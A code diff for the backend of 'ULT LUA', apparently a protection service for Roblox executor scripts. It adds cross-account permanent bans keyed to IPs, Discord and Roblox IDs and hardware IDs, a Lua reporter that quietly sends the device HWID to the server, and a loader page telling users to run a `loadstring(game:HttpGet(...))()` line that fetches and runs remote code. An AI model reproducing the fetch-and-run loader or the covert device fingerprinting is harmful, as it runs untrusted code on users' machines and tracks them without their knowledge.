@@ -16,8 +16,8 @@ const corsHeaders = {
 // Hardcoded ban lists removed — all bans are managed via the global_bans DB table
 
 // In-memory cache of DB global bans (refreshed every 60s)
-let globalBanCache: { ips: Set<string>; subnets: string[]; robloxIds: Set<string>; discordIds: Set<string>; lastRefresh: number } = {
-  ips: new Set(), subnets: [], robloxIds: new Set(), discordIds: new Set(), lastRefresh: 0
+let globalBanCache: { ips: Set<string>; subnets: string[]; robloxIds: Set<string>; discordIds: Set<string>; hwids: Set<string>; lastRefresh: number } = {
+  ips: new Set(), subnets: [], robloxIds: new Set(), discordIds: new Set(), hwids: new Set(), lastRefresh: 0
 };
 
 async function refreshGlobalBans() {
@@ -28,13 +28,15 @@ async function refreshGlobalBans() {
     const subnets: string[] = [];
     const robloxIds = new Set<string>();
     const discordIds = new Set<string>();
+    const hwids = new Set<string>();
     for (const ban of data || []) {
       if (ban.ban_type === 'ip') ips.add(ban.ban_value);
       else if (ban.ban_type === 'subnet') subnets.push(ban.ban_value);
       else if (ban.ban_type === 'roblox_id') robloxIds.add(ban.ban_value);
       else if (ban.ban_type === 'discord_id') discordIds.add(ban.ban_value);
+      else if (ban.ban_type === 'hwid') hwids.add(ban.ban_value);
     }
-    globalBanCache = { ips, subnets, robloxIds, discordIds, lastRefresh: Date.now() };
+    globalBanCache = { ips, subnets, robloxIds, discordIds, hwids, lastRefresh: Date.now() };
     // Also refresh admin IPs so they're never banned
     await refreshAdminIps();
   } catch (e) {
@@ -60,6 +62,13 @@ function isRobloxIdBanned(robloxUserId: string): boolean {
 function isDiscordIdBanned(discordUserId: string): boolean {
   return globalBanCache.discordIds.has(discordUserId);
 }
+
+// v16: device-level (HWID) ban — blocks the machine, not just the account
+function isHwidBanned(hwid: string | null): boolean {
+  if (!hwid || hwid.length < 4) return false;
+  return globalBanCache.hwids.has(hwid);
+}
+
 
 // Log threat to DB (fire-and-forget)
 function logThreat(type: string, ip: string | null, robloxId: string | null, discordId: string | null, details: any, severity: string, autoResolve = false) {
@@ -131,6 +140,163 @@ function autoBanNewIp(ip: string, reason: string, robloxId: string | null, disco
     reason: banReason 
   }, 'high', true);
 }
+
+// ===== v17: UNIFIED PERMANENT BAN ENGINE =====
+// One entry point for every auto-ban path. Bans EVERY identifier tied to the
+// offender (ip, roblox id, discord id, device/hwid) permanently, expands to
+// every linked identity we have ever seen, and stores full evidence.
+type BanIdentity = {
+  ip?: string | null;
+  robloxId?: string | null;
+  discordId?: string | null;
+  hwid?: string | null;
+};
+
+const bannedIdentifiersThisSession = new Set<string>();
+
+function isValidRobloxId(id: string | null | undefined): id is string {
+  return !!id && /^\d+$/.test(id) && parseInt(id) > 1000;
+}
+
+async function writeBan(
+  banType: 'ip' | 'roblox_id' | 'discord_id' | 'hwid',
+  value: string,
+  reason: string,
+  metadata: Record<string, unknown>,
+) {
+  const cacheKey = `${banType}:${value}`;
+  if (bannedIdentifiersThisSession.has(cacheKey)) return false;
+  bannedIdentifiersThisSession.add(cacheKey);
+
+  // Update in-memory cache instantly so the very next request is blocked
+  if (banType === 'ip') globalBanCache.ips.add(value);
+  else if (banType === 'roblox_id') globalBanCache.robloxIds.add(value);
+  else if (banType === 'discord_id') globalBanCache.discordIds.add(value);
+  else if (banType === 'hwid') globalBanCache.hwids.add(value);
+
+  try {
+    await supabase.from('global_bans').upsert({
+      ban_type: banType,
+      ban_value: value,
+      reason,
+      is_active: true,
+      metadata,
+    }, { onConflict: 'ban_type,ban_value' });
+    return true;
+  } catch (e) {
+    console.error(`[BAN-ENGINE] failed to persist ${cacheKey}:`, e);
+    return false;
+  }
+}
+
+/**
+ * Permanently ban an offender across every identifier we can link to them.
+ * ruleId  — stable machine-readable rule name (e.g. "exfil_webhook")
+ * evidence — raw signal payload preserved for review (never trimmed away)
+ */
+async function banIdentity(
+  identity: BanIdentity,
+  ruleId: string,
+  evidence: Record<string, unknown>,
+): Promise<{ banned: string[] }> {
+  const banned: string[] = [];
+  const seedIp = identity.ip && identity.ip !== 'unknown' ? identity.ip : null;
+  const seedRoblox = isValidRobloxId(identity.robloxId) ? identity.robloxId : null;
+  const seedDiscord = identity.discordId || null;
+  const seedHwid = identity.hwid && identity.hwid.length >= 4 ? identity.hwid : null;
+
+  const reason = `Permanent ban [${ruleId}]`;
+  const baseMeta = {
+    rule_id: ruleId,
+    permanent: true,
+    banned_at: new Date().toISOString(),
+    seed: { ip: seedIp, roblox_id: seedRoblox, discord_id: seedDiscord, hwid: seedHwid },
+    evidence,
+  };
+
+  const ips = new Set<string>();
+  const robloxIds = new Set<string>();
+  const discordIds = new Set<string>();
+  const hwids = new Set<string>();
+  if (seedIp && !isAdminIp(seedIp)) ips.add(seedIp);
+  if (seedRoblox) robloxIds.add(seedRoblox);
+  if (seedDiscord) discordIds.add(seedDiscord);
+  if (seedHwid) hwids.add(seedHwid);
+
+  // ---- Identity expansion: everything this offender has ever been seen as ----
+  try {
+    const orFilters: string[] = [];
+    if (seedRoblox) orFilters.push(`roblox_user_id.eq.${seedRoblox}`);
+    if (seedDiscord) orFilters.push(`discord_user_id.eq.${seedDiscord}`);
+    if (seedIp) orFilters.push(`ip_address.eq.${seedIp}`);
+    if (orFilters.length) {
+      const { data: linked } = await supabase
+        .from('paste_access_logs')
+        .select('ip_address, roblox_user_id, discord_user_id')
+        .or(orFilters.join(','))
+        .limit(500);
+      for (const row of linked || []) {
+        if (row.ip_address && !isAdminIp(row.ip_address)) ips.add(row.ip_address);
+        if (isValidRobloxId(row.roblox_user_id)) robloxIds.add(row.roblox_user_id);
+        if (row.discord_user_id) discordIds.add(row.discord_user_id);
+      }
+    }
+
+    // Device linkage — the machine and every account that ever used it
+    const hwidFilters: string[] = [];
+    if (seedHwid) hwidFilters.push(`hwid.eq.${seedHwid}`);
+    for (const rid of robloxIds) hwidFilters.push(`roblox_user_id.eq.${rid}`);
+    if (hwidFilters.length) {
+      const { data: locks } = await supabase
+        .from('paste_hwid_locks')
+        .select('hwid, roblox_user_id')
+        .or(hwidFilters.slice(0, 40).join(','))
+        .limit(500);
+      for (const row of locks || []) {
+        if (row.hwid && row.hwid.length >= 4) hwids.add(row.hwid);
+        if (isValidRobloxId(row.roblox_user_id)) robloxIds.add(row.roblox_user_id);
+      }
+    }
+  } catch (e) {
+    console.error('[BAN-ENGINE] identity expansion failed (banning seeds only):', e);
+  }
+
+  // ---- Apply the bans ----
+  for (const ip of ips) {
+    if (isAdminIp(ip)) continue;
+    if (await writeBan('ip', ip, reason, { ...baseMeta, linked_via: ip === seedIp ? 'seed' : 'identity_graph' })) {
+      autoBannedIpsThisSession.add(ip);
+      banned.push(`ip:${ip}`);
+    }
+  }
+  for (const rid of robloxIds) {
+    if (await writeBan('roblox_id', rid, reason, { ...baseMeta, linked_via: rid === seedRoblox ? 'seed' : 'identity_graph' })) {
+      banned.push(`roblox_id:${rid}`);
+    }
+  }
+  for (const did of discordIds) {
+    if (await writeBan('discord_id', did, reason, { ...baseMeta, linked_via: did === seedDiscord ? 'seed' : 'identity_graph' })) {
+      banned.push(`discord_id:${did}`);
+    }
+  }
+  for (const h of hwids) {
+    if (await writeBan('hwid', h, reason, { ...baseMeta, linked_via: h === seedHwid ? 'seed' : 'identity_graph' })) {
+      banned.push(`hwid:${h}`);
+    }
+  }
+
+  logThreat(`ban_engine_${ruleId}`, seedIp, seedRoblox, seedDiscord, {
+    rule_id: ruleId,
+    evidence,
+    identifiers_banned: banned,
+    counts: { ips: ips.size, roblox: robloxIds.size, discord: discordIds.size, hwids: hwids.size },
+  }, 'critical', true);
+
+  console.log(`[BAN-ENGINE] ${ruleId} -> ${banned.length} identifiers banned`);
+  return { banned };
+}
+
+
 
 // Enhanced rate limiting with IP tracking (persists within isolate lifetime)
 const rateLimits = new Map<string, { count: number; resetTime: number; blocked: boolean }>();
@@ -306,6 +472,80 @@ function isDirectSlugBrowserView(url: URL): boolean {
 
 const QUIET_ACCESS_DENIED_LUA = '-- Access denied';
 const PROTECTED_BROWSER_PLACEHOLDER = '-- Protected by ULT LUA';
+
+// Mint & peach site theme, inlined so the backend page looks identical to the site.
+const PAGE_STYLE = `
+:root{--bg:#fbfaf6;--fg:#141f1d;--muted:#5d6b68;--card:rgba(255,255,255,.78);
+--border:rgba(20,31,29,.10);--primary:#2c9464;--accent:#ef7429;--danger:#c0392b}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;background:var(--bg);color:var(--fg);
+font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+background-image:radial-gradient(circle at 12% 18%,rgba(44,148,100,.10),transparent 45%),
+radial-gradient(circle at 88% 8%,rgba(239,116,41,.10),transparent 45%);
+background-attachment:fixed;padding:40px 16px}
+.wrap{max-width:760px;margin:0 auto;display:flex;flex-direction:column;gap:20px}
+.card{background:var(--card);backdrop-filter:blur(18px);border:1px solid var(--border);
+border-radius:20px;padding:24px;box-shadow:0 10px 30px rgba(20,31,29,.06)}
+h1{margin:6px 0 8px;font-size:28px}h2{margin:0 0 6px;font-size:18px}
+h3{margin:0 0 6px;font-size:14px}p{margin:0;color:var(--muted);font-size:14px;line-height:1.55}
+.pill{display:inline-block;font-size:10px;letter-spacing:.12em;text-transform:uppercase;
+border:1px solid var(--border);border-radius:999px;padding:4px 10px;color:var(--muted)}
+pre{overflow-x:auto;background:rgba(20,31,29,.05);border:1px solid var(--border);
+border-radius:14px;padding:16px;margin:16px 0;font-size:13px;white-space:pre-wrap;word-break:break-all}
+button,a.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;width:100%;
+border:0;border-radius:12px;padding:12px 16px;font-size:14px;font-weight:600;cursor:pointer;
+background:var(--primary);color:#fff;text-decoration:none}
+a.ghost{background:transparent;color:var(--fg);border:1px solid var(--border)}
+.grid{display:grid;gap:12px;grid-template-columns:1fr}
+@media(min-width:640px){.grid{grid-template-columns:1fr 1fr}}
+.tile{border:1px solid var(--border);border-radius:14px;padding:14px;background:rgba(255,255,255,.5)}
+.tile h3{color:var(--primary)}
+.ban h1{color:var(--danger)}
+`;
+
+function escapeHtml(value: string): string {
+  return value.replace(/[&<>"']/g, (c) => (
+    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c] as string
+  ));
+}
+
+function generateBrandedLoaderPage(slug: string, host: string): string {
+  const site = host ? `https://${host}` : '';
+  const loadstring = `loadstring(game:HttpGet("${site}/s/${slug}"))()`;
+  return `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Protected script loader | ULT LUA</title>
+<meta name="description" content="Official loadstring for this protected script.">
+<style>${PAGE_STYLE}</style></head><body><div class="wrap">
+<a class="btn ghost" href="/">&larr; Back to homepage</a>
+<div class="card"><span class="pill">Protected script</span>
+<h1>Loadstring</h1>
+<p>This is the official link for this script. Copy it and run it in your executor — nothing else is needed.</p>
+<pre id="ls">${escapeHtml(loadstring)}</pre>
+<button onclick="navigator.clipboard.writeText(document.getElementById('ls').innerText);this.innerText='Copied'">Copy loadstring</button>
+</div>
+<div class="card"><h2>Why bypassing this is a bad afternoon</h2>
+<p>A short version — the details stay ours.</p><div class="grid" style="margin-top:14px">
+<div class="tile"><h3>Nothing is served in plain text</h3><p>Every delivery is encrypted and single-use. What you fetch once is never valid again.</p></div>
+<div class="tile"><h3>The request is bound to you</h3><p>Session, device and network fingerprints are tied together before a single line is released.</p></div>
+<div class="tile"><h3>Tampering answers back</h3><p>Hooked functions, dumps and relays are recognised on the spot and the session is dropped.</p></div>
+<div class="tile"><h3>One strike is permanent</h3><p>Unauthorized entry points are watched. Touch one and every identifier you own is retired for good.</p></div>
+</div></div></div></body></html>`;
+}
+
+function generatePermanentBanPage(): string {
+  return `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Permanently banned | ULT LUA</title>
+<style>${PAGE_STYLE}</style></head><body><div class="wrap ban">
+<div class="card"><span class="pill">Unauthorized entry point</span>
+<h1>You are permanently banned</h1>
+<p>You reached an internal endpoint that is not an authorized entry point. Your account, network and
+device identifiers have been retired permanently. New accounts, new networks and reset devices do not
+change this — every script protected by ULT LUA will refuse to run for you from now on.</p></div>
+</div></body></html>`;
+}
+
 
 function shouldAutoBanBypassReason(reason: string, details: string): boolean {
   const normalizedReason = (reason || '').toLowerCase().trim();
@@ -941,10 +1181,20 @@ local _reportBypass = function(reason, details)
     local p = game:GetService("Players").LocalPlayer
     if p then uid = tostring(p.UserId) end
   end)
+  local rhwid = ""
   pcall(function()
-    local reportUrl = "${baseUrl}?_report=bypass&uid=" .. uid .. "&reason=" .. tostring(reason or "unknown") .. "&details=" .. tostring(details or "")
+    if gethwid then rhwid = tostring(gethwid()) end
+  end)
+  if rhwid == "" then
+    pcall(function()
+      rhwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
+    end)
+  end
+  pcall(function()
+    local reportUrl = "${baseUrl}?_report=bypass&uid=" .. uid .. "&hwid=" .. rhwid .. "&reason=" .. tostring(reason or "unknown") .. "&details=" .. tostring(details or "")
     game:HttpGet(reportUrl)
   end)
+
   -- REMOVED: ${v.dumpPoison} = true
   -- dumpPoison was corrupting code for ALL bypass reports including false positives
   -- (fetch_intent, deep_stack, cclosure_tamper etc fire on normal executors)
@@ -2650,19 +2900,25 @@ end
 `;
 }
 
-// ===== KEY SYSTEM GUI GENERATOR v5 =====
-// Matches the landing page preview: same purple theme, two-panel layout, console feedback, progress flow, and instant unload on success.
+// ===== KEY SYSTEM GUI GENERATOR v6 (Rectangle + Post-Key Verification) =====
+// Redesigned to a wide rectangle window with a dedicated post-key verification
+// screen that appears after the key is accepted. The verification screen shows
+// a checkmark, verified-credentials list, and a streaming payload bar before
+// the script is executed and the UI unloaded.
 function generateKeySystemGui(slug: string, baseUrl: string, panelName: string, themeColor: string, decalId?: string): string {
   const normalizedTheme = (themeColor || '').trim();
+  // Mint primary by default (matches website theme 140 55% 65% -> ~#7ED4A1)
   const resolvedTheme = !normalizedTheme || normalizedTheme === '255, 255, 255'
-    ? '188, 134, 255'
+    ? '126, 212, 161'
     : normalizedTheme;
-  const colorParts = resolvedTheme.split(',').map(s => s.trim());
-  const r = colorParts[0] || '180';
-  const g = colorParts[1] || '120';
-  const b = colorParts[2] || '255';
+  const parts = resolvedTheme.split(',').map(s => s.trim());
+  const r = parts[0] || '126';
+  const g = parts[1] || '212';
+  const b = parts[2] || '161';
+  // Peach accent (matches website theme 24 95% 78% -> ~#FBB989)
+  const ar = '251', ag = '185', ab = '137';
 
-  return `-- ULT Key System v5 (Landing Match)
+  return `-- ULT Key System v6 (Rectangle + Post-Key Verification)
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -2681,6 +2937,7 @@ gui.Name = "ULTKeySystem"
 gui.ResetOnSpawn = false
 gui.DisplayOrder = 999999999
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.IgnoreGuiInset = true
 gui.Parent = pgui
 
 -- Blur
@@ -2688,22 +2945,29 @@ local blur = Instance.new("BlurEffect")
 blur.Name = "ULTBlur"
 blur.Size = 0
 blur.Parent = Lighting
-TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {Size = 20}):Play()
+TweenService:Create(blur, TweenInfo.new(0.35, Enum.EasingStyle.Quad), {Size = 18}):Play()
 
-local themeCol = Color3.fromRGB(${r}, ${g}, ${b})
-local dimTheme = Color3.fromRGB(math.floor(${r}*0.34), math.floor(${g}*0.34), math.floor(${b}*0.34))
-local bgColor = Color3.fromRGB(16, 14, 22)
-local panelBg = Color3.fromRGB(22, 19, 30)
-local borderCol = Color3.fromRGB(64, 49, 92)
-local mutedText = Color3.fromRGB(133, 126, 150)
-local fgColor = Color3.fromRGB(244, 240, 250)
-local cardBg = Color3.fromRGB(24, 21, 35)
-local softBg = Color3.fromRGB(19, 16, 27)
-local successCol = Color3.fromRGB(86, 255, 120)
-local dangerCol = Color3.fromRGB(255, 96, 96)
-local warningCol = Color3.fromRGB(255, 168, 92)
+-- Dim overlay
+local dim = Instance.new("Frame", gui)
+dim.Size = UDim2.new(1, 0, 1, 0)
+dim.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+dim.BackgroundTransparency = 1
+dim.BorderSizePixel = 0
+dim.ZIndex = 1
+TweenService:Create(dim, TweenInfo.new(0.3), {BackgroundTransparency = 0.45}):Play()
 
--- Helper: rounded frame
+local themeCol   = Color3.fromRGB(${r}, ${g}, ${b})
+local accentCol  = Color3.fromRGB(${ar}, ${ag}, ${ab})
+local bgColor    = Color3.fromRGB(18, 20, 26)
+local panelBg    = Color3.fromRGB(24, 27, 34)
+local softBg     = Color3.fromRGB(30, 33, 41)
+local borderCol  = Color3.fromRGB(55, 60, 72)
+local mutedText  = Color3.fromRGB(150, 156, 170)
+local fgColor    = Color3.fromRGB(240, 244, 252)
+local successCol = Color3.fromRGB(126, 212, 161)
+local dangerCol  = Color3.fromRGB(255, 106, 106)
+local warningCol = Color3.fromRGB(255, 176, 100)
+
 local function makePanel(parent, size, pos, bg, zIdx, radius)
     local f = Instance.new("Frame", parent)
     f.Size = size
@@ -2712,15 +2976,15 @@ local function makePanel(parent, size, pos, bg, zIdx, radius)
     f.BorderSizePixel = 0
     f.ZIndex = zIdx or 4
     local c = Instance.new("UICorner", f)
-    c.CornerRadius = UDim.new(0, radius or 18)
+    c.CornerRadius = UDim.new(0, radius or 14)
     return f
 end
 
-local function addStroke(frame, col, thick)
+local function addStroke(frame, col, thick, trans)
     local s = Instance.new("UIStroke", frame)
     s.Color = col or borderCol
     s.Thickness = thick or 1
-    s.Transparency = 0
+    s.Transparency = trans or 0
     return s
 end
 
@@ -2732,209 +2996,258 @@ local function addLabel(parent, size, pos, text, color, font, textSize, align, z
     l.Text = text
     l.TextColor3 = color
     l.Font = font or Enum.Font.Gotham
-    l.TextSize = textSize or 11
+    l.TextSize = textSize or 12
     l.TextXAlignment = align or Enum.TextXAlignment.Left
     l.ZIndex = zIdx or 5
     l.TextWrapped = true
     return l
 end
 
--- Main window (matched closer to landing preview)
-local win = Instance.new("Frame", gui)
-win.Name = "MainWindow"
-win.Size = UDim2.new(0, 720, 0, 408)
-win.Position = UDim2.new(0.5, -360, 0.5, -204)
-win.BackgroundColor3 = bgColor
-win.BorderSizePixel = 0
-win.BackgroundTransparency = 1
-win.ZIndex = 3
+-- ============ WIDE RECTANGLE WINDOW ============
+local win = makePanel(gui, UDim2.new(0, 760, 0, 340), UDim2.new(0.5, -380, 0.5, -170), bgColor, 3, 20)
 win.ClipsDescendants = true
+addStroke(win, borderCol, 1, 0.15)
+win.Size = UDim2.new(0, 760, 0, 340)
+-- Entrance animation
+win.BackgroundTransparency = 1
+local camera = workspace.CurrentCamera
+local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
+local fitScale = math.min(1, math.max(0.52, (viewport.X - 28) / 760), math.max(0.52, (viewport.Y - 120) / 340))
+local scaleHolder = Instance.new("UIScale", win); scaleHolder.Scale = fitScale * 0.94
+TweenService:Create(win, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
+TweenService:Create(scaleHolder, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = fitScale}):Play()
 
-local winCorner = Instance.new("UICorner", win)
-winCorner.CornerRadius = UDim.new(0, 28)
-addStroke(win, borderCol, 1).Transparency = 0.22
-
--- Title bar
-local titleBar = Instance.new("Frame", win)
-titleBar.Size = UDim2.new(1, 0, 0, 44)
-titleBar.Position = UDim2.new(0, 0, 0, 0)
-titleBar.BackgroundColor3 = bgColor
-titleBar.BorderSizePixel = 0
-titleBar.ZIndex = 4
-titleBar.Active = true
-titleBar.ClipsDescendants = true
-local titleBarCorner = Instance.new("UICorner", titleBar)
-titleBarCorner.CornerRadius = UDim.new(0, 28)
-local titleBarFill = Instance.new("Frame", titleBar)
-titleBarFill.Size = UDim2.new(1, 0, 0, 18)
-titleBarFill.Position = UDim2.new(0, 0, 1, -18)
-titleBarFill.BackgroundColor3 = bgColor
-titleBarFill.BorderSizePixel = 0
-titleBarFill.ZIndex = 4
-
--- Dots
-local function makeDot(parent, pos, col, action)
-    local dot = Instance.new("TextButton", parent)
-    dot.Size = UDim2.new(0, 10, 0, 10)
-    dot.Position = pos
-    dot.BackgroundColor3 = col
-    dot.BorderSizePixel = 0
-    dot.Text = ""
-    dot.AutoButtonColor = false
-    dot.ZIndex = 6
-    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
-    if action then dot.MouseButton1Click:Connect(action) end
-    return dot
+if camera then
+    camera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
+        local nextViewport = camera.ViewportSize
+        fitScale = math.min(1, math.max(0.52, (nextViewport.X - 28) / 760), math.max(0.52, (nextViewport.Y - 120) / 340))
+        scaleHolder.Scale = fitScale
+    end)
 end
 
-local dot1 = makeDot(titleBar, UDim2.new(0, 18, 0.5, -5), Color3.fromRGB(245, 245, 248), nil)
-local dot2 = makeDot(titleBar, UDim2.new(0, 38, 0.5, -5), Color3.fromRGB(86, 76, 112), nil)
-local dot3 = makeDot(titleBar, UDim2.new(0, 58, 0.5, -5), Color3.fromRGB(54, 46, 75), nil)
+-- Top bar (dots + brand)
+local topBar = makePanel(win, UDim2.new(1, 0, 0, 44), UDim2.new(0, 0, 0, 0), bgColor, 4, 20)
+topBar.Active = true
 
-addLabel(titleBar, UDim2.new(0, 200, 1, 0), UDim2.new(1, -214, 0, 0),
-    "Ult Loader v6.1", mutedText, Enum.Font.GothamMedium, 9, Enum.TextXAlignment.Right, 5)
+local function dot(parent, x, col)
+    local d = Instance.new("Frame", parent)
+    d.Size = UDim2.new(0, 10, 0, 10)
+    d.Position = UDim2.new(0, x, 0.5, -5)
+    d.BackgroundColor3 = col
+    d.BorderSizePixel = 0
+    d.ZIndex = 6
+    Instance.new("UICorner", d).CornerRadius = UDim.new(1, 0)
+    return d
+end
+dot(topBar, 18, Color3.fromRGB(255, 106, 106))
+dot(topBar, 36, Color3.fromRGB(255, 190, 90))
+dot(topBar, 54, successCol)
 
--- Content area (two columns)
-local contentArea = Instance.new("Frame", win)
-contentArea.Size = UDim2.new(1, -24, 1, -56)
-contentArea.Position = UDim2.new(0, 12, 0, 44)
-contentArea.BackgroundTransparency = 1
-contentArea.ZIndex = 4
+addLabel(topBar, UDim2.new(0, 220, 1, 0), UDim2.new(0, 78, 0, 0),
+    "ULT LOADER  //  ${panelName}", fgColor, Enum.Font.GothamBold, 12, Enum.TextXAlignment.Left, 6)
 
--- ===== LEFT PANEL =====
-local leftPanel = makePanel(contentArea, UDim2.new(0.58, -6, 1, 0), UDim2.new(0, 0, 0, 0), panelBg, 4, 24)
-addStroke(leftPanel, borderCol)
+addLabel(topBar, UDim2.new(0, 200, 1, 0), UDim2.new(1, -214, 0, 0),
+    "v6.1  secure route", mutedText, Enum.Font.GothamMedium, 10, Enum.TextXAlignment.Right, 6)
 
--- "INSTANT DELIVERY" label
-addLabel(leftPanel, UDim2.new(1, -20, 0, 14), UDim2.new(0, 12, 0, 12),
-    "INSTANT DELIVERY", themeCol, Enum.Font.GothamBold, 9, Enum.TextXAlignment.Left, 5)
+-- Divider
+local div = Instance.new("Frame", win)
+div.Size = UDim2.new(1, -32, 0, 1)
+div.Position = UDim2.new(0, 16, 0, 44)
+div.BackgroundColor3 = borderCol
+div.BackgroundTransparency = 0.4
+div.BorderSizePixel = 0
+div.ZIndex = 4
 
--- "ULT CLOUD" title
-addLabel(leftPanel, UDim2.new(0, 180, 0, 28), UDim2.new(0, 12, 0, 28),
-    "ULT CLOUD", fgColor, Enum.Font.GothamBlack, 20, Enum.TextXAlignment.Left, 5)
+-- ============ SCREEN 1: KEY ENTRY ============
+local entry = Instance.new("Frame", win)
+entry.Size = UDim2.new(1, -32, 1, -60)
+entry.Position = UDim2.new(0, 16, 0, 52)
+entry.BackgroundTransparency = 1
+entry.ZIndex = 4
 
--- Status badge
-local statusBadge = makePanel(leftPanel, UDim2.new(0, 80, 0, 28), UDim2.new(1, -96, 0, 28), dimTheme, 5, 14)
-addStroke(statusBadge, themeCol).Transparency = 0.6
-local statusBadgeText = addLabel(statusBadge, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0),
-    "Ready", fgColor, Enum.Font.GothamBold, 9, Enum.TextXAlignment.Center, 6)
+-- Heading
+addLabel(entry, UDim2.new(1, 0, 0, 18), UDim2.new(0, 0, 0, 4),
+    "ENTER ACCESS KEY", accentCol, Enum.Font.GothamBold, 10, Enum.TextXAlignment.Left, 5)
+addLabel(entry, UDim2.new(1, 0, 0, 26), UDim2.new(0, 0, 0, 22),
+    "Paste your key below to unlock this script.", fgColor, Enum.Font.GothamBold, 18, Enum.TextXAlignment.Left, 5)
 
--- Key input area
-local inputFrame = makePanel(leftPanel, UDim2.new(1, -24, 0, 50), UDim2.new(0, 12, 0, 72), Color3.fromRGB(79, 75, 90), 5, 18)
-addStroke(inputFrame, borderCol).Transparency = 0.4
-
-local inputPrefix = addLabel(inputFrame, UDim2.new(0, 120, 1, 0), UDim2.new(0, 10, 0, 0),
-    "Enter your key >", mutedText, Enum.Font.RobotoMono, 12, Enum.TextXAlignment.Left, 6)
+-- Key input rectangle
+local inputFrame = makePanel(entry, UDim2.new(1, 0, 0, 58), UDim2.new(0, 0, 0, 60), softBg, 5, 14)
+local inputStroke = addStroke(inputFrame, borderCol, 1, 0.2)
+addLabel(inputFrame, UDim2.new(0, 140, 1, 0), UDim2.new(0, 14, 0, 0),
+    "KEY >", mutedText, Enum.Font.RobotoMono, 13, Enum.TextXAlignment.Left, 6)
 
 local input = Instance.new("TextBox", inputFrame)
-input.Size = UDim2.new(1, -140, 1, 0)
-input.Position = UDim2.new(0, 132, 0, 0)
+input.Size = UDim2.new(1, -170, 1, 0)
+input.Position = UDim2.new(0, 60, 0, 0)
 input.BackgroundTransparency = 1
 input.Text = ""
 input.PlaceholderText = "XXXXX-XXXXX-XXXXX"
-input.PlaceholderColor3 = Color3.fromRGB(60, 55, 70)
+input.PlaceholderColor3 = Color3.fromRGB(80, 86, 100)
 input.TextColor3 = fgColor
 input.Font = Enum.Font.RobotoMono
-input.TextSize = 13
+input.TextSize = 15
 input.TextXAlignment = Enum.TextXAlignment.Left
 input.ClearTextOnFocus = false
 input.ZIndex = 6
 
--- Verification progress area
-local progressLabel = addLabel(leftPanel, UDim2.new(0.7, 0, 0, 12), UDim2.new(0, 12, 0, 136),
-    "Animated verification progress", mutedText, Enum.Font.GothamBold, 8, Enum.TextXAlignment.Left, 5)
+-- Submit button (rectangle, right side)
+local submit = Instance.new("TextButton", inputFrame)
+submit.Size = UDim2.new(0, 96, 0, 38)
+submit.Position = UDim2.new(1, -106, 0.5, -19)
+submit.BackgroundColor3 = themeCol
+submit.BorderSizePixel = 0
+submit.Text = "VERIFY"
+submit.Font = Enum.Font.GothamBold
+submit.TextSize = 12
+submit.TextColor3 = Color3.fromRGB(18, 20, 26)
+submit.AutoButtonColor = false
+submit.ZIndex = 7
+Instance.new("UICorner", submit).CornerRadius = UDim.new(0, 10)
 
-local progressPct = addLabel(leftPanel, UDim2.new(0, 40, 0, 12), UDim2.new(1, -52, 0, 136),
-    "0%", mutedText, Enum.Font.GothamBold, 8, Enum.TextXAlignment.Right, 5)
+-- Status row
+local statusRow = Instance.new("Frame", entry)
+statusRow.Size = UDim2.new(1, 0, 0, 20)
+statusRow.Position = UDim2.new(0, 0, 0, 128)
+statusRow.BackgroundTransparency = 1
+statusRow.ZIndex = 5
 
--- Progress bar background
-local progressBg = makePanel(leftPanel, UDim2.new(1, -24, 0, 10), UDim2.new(0, 12, 0, 154), Color3.fromRGB(39, 34, 52), 5, 999)
-local progressFill = Instance.new("Frame", progressBg)
-progressFill.Size = UDim2.new(0, 0, 1, 0)
-progressFill.BackgroundColor3 = themeCol
-progressFill.BorderSizePixel = 0
-progressFill.ZIndex = 6
-Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 999)
+local statusDot = Instance.new("Frame", statusRow)
+statusDot.Size = UDim2.new(0, 8, 0, 8)
+statusDot.Position = UDim2.new(0, 0, 0.5, -4)
+statusDot.BackgroundColor3 = themeCol
+statusDot.BorderSizePixel = 0
+statusDot.ZIndex = 6
+Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
 
-local progressGradient = Instance.new("UIGradient", progressFill)
-progressGradient.Color = ColorSequence.new({
+local statusText = addLabel(statusRow, UDim2.new(1, -16, 1, 0), UDim2.new(0, 14, 0, 0),
+    "Awaiting key input", mutedText, Enum.Font.GothamMedium, 11, Enum.TextXAlignment.Left, 6)
+
+-- Info tiles at bottom
+local tiles = Instance.new("Frame", entry)
+tiles.Size = UDim2.new(1, 0, 0, 76)
+tiles.Position = UDim2.new(0, 0, 1, -76)
+tiles.BackgroundTransparency = 1
+tiles.ZIndex = 4
+
+local function tile(x, label, val, col)
+    local t = makePanel(tiles, UDim2.new(0, 224, 1, 0), UDim2.new(0, x, 0, 0), softBg, 5, 12)
+    addStroke(t, borderCol, 1, 0.35)
+    addLabel(t, UDim2.new(1, -20, 0, 12), UDim2.new(0, 12, 0, 12),
+        label, mutedText, Enum.Font.GothamBold, 9, Enum.TextXAlignment.Left, 6)
+    addLabel(t, UDim2.new(1, -20, 0, 18), UDim2.new(0, 12, 0, 30),
+        val, col or fgColor, Enum.Font.GothamBold, 15, Enum.TextXAlignment.Left, 6)
+    return t
+end
+tile(0,   "RESPONSE",  "0.2s",       themeCol)
+tile(238, "PAYLOAD",   "Encrypted",  accentCol)
